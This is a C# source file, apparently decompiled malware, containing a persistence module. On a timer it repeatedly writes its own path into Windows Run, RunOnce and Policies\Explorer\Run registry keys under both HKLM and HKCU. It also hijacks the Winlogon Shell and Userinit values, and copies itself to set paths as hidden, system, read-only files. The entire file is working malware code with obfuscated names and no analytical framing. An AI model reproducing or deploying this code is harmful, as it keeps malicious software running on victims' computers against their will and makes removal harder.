using System;
using System.Diagnostics;
using System.IO;
using System.Timers;
using Microsoft.Win32;

namespace _2012;

internal class x0_per
{
	private static Timer chktimer = new Timer();

	private static string xselfp = Process.GetCurrentProcess().MainModule!.FileName;

	public static void cargape()
	{
		chktimer.Interval = 450000.0;
		chktimer.Elapsed += chkpro;
		chktimer.Start();
	}

	public static void stopPersistent()
	{
		chktimer.Stop();
		chktimer.Dispose();
	}

	private static void chkpro(object sender, ElapsedEventArgs e)
	{
		if (x0_fnc.fnc_admin())
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey.Equals(x0_ins.registro[0]))
				{
					if (registryKey.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey.Equals(x0_ins.registro[1]))
				{
					if (registryKey.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (registryKey2.Equals(x0_ins.registro[0]))
				{
					if (registryKey2.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey2.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey2.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey2.Equals(x0_ins.registro[1]))
				{
					if (registryKey2.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey2.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey2.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
				RegistryKey registryKey3 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
				if (registryKey3.Equals(x0_ins.registro[0]))
				{
					if (registryKey3.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey3.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey3.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey3.Equals(x0_ins.registro[1]))
				{
					if (registryKey3.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey3.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey3.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
				RegistryKey registryKey4 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
				if (registryKey4.Equals("Shell"))
				{
					if (registryKey4.GetValue("Shell")!.ToString() != "Explorer.exe \"" + x0_ins.paths[0] + "\"")
					{
						registryKey4.SetValue("Shell", "Explorer.exe \"" + x0_ins.paths[0] + "\"");
					}
				}
				else
				{
					registryKey4.SetValue("Shell", "Explorer.exe \"" + x0_ins.paths[0] + "\"");
				}
				if (registryKey4.Equals("Userinit"))
				{
					if (registryKey4.GetValue("Userinit")!.ToString() != "userinit.exe \"" + x0_ins.paths[0] + "\"")
					{
						registryKey4.SetValue("Userinit", "userinit.exe \"" + x0_ins.paths[0] + "\"");
					}
				}
				else
				{
					registryKey4.SetValue("Userinit", "userinit.exe \"" + x0_ins.paths[0] + "\"");
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
		}
		else
		{
			try
			{
				RegistryKey registryKey5 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey5.Equals(x0_ins.registro[0]))
				{
					if (registryKey5.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey5.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey5.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey5.Equals(x0_ins.registro[1]))
				{
					if (registryKey5.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey5.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey5.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
				RegistryKey registryKey6 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (registryKey6.Equals(x0_ins.registro[0]))
				{
					if (registryKey6.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey6.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey6.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey6.Equals(x0_ins.registro[1]))
				{
					if (registryKey6.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey6.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey6.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
				RegistryKey registryKey7 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", writable: true);
				if (registryKey7.Equals(x0_ins.registro[0]))
				{
					if (registryKey7.GetValue(x0_ins.registro[0])!.ToString() != '"' + x0_ins.paths[0] + '"')
					{
						registryKey7.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
					}
				}
				else
				{
					registryKey7.SetValue(x0_ins.registro[0], '"' + x0_ins.paths[0] + '"');
				}
				if (registryKey7.Equals(x0_ins.registro[1]))
				{
					if (registryKey7.GetValue(x0_ins.registro[1])!.ToString() != '"' + x0_ins.paths[1] + '"')
					{
						registryKey7.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
					}
				}
				else
				{
					registryKey7.SetValue(x0_ins.registro[1], '"' + x0_ins.paths[1] + '"');
				}
			}
			catch (Exception value2)
			{
				Console.WriteLine(value2);
			}
		}
		try
		{
			string[] paths = x0_ins.paths;
			foreach (string text in paths)
			{
				if (!x0_fnc.checkFile(text))
				{
					File.SetAttributes(text, File.GetAttributes(text) | FileAttributes.Normal);
					File.Copy(xselfp, text, overwrite: true);
					File.SetAttributes(text, File.GetAttributes(text) | FileAttributes.System | FileAttributes.Hidden | FileAttributes.ReadOnly | FileAttributes.NotContentIndexed);
				}
			}
		}
		catch (Exception value3)
		{
			Console.WriteLine(value3);
		}
	}
}
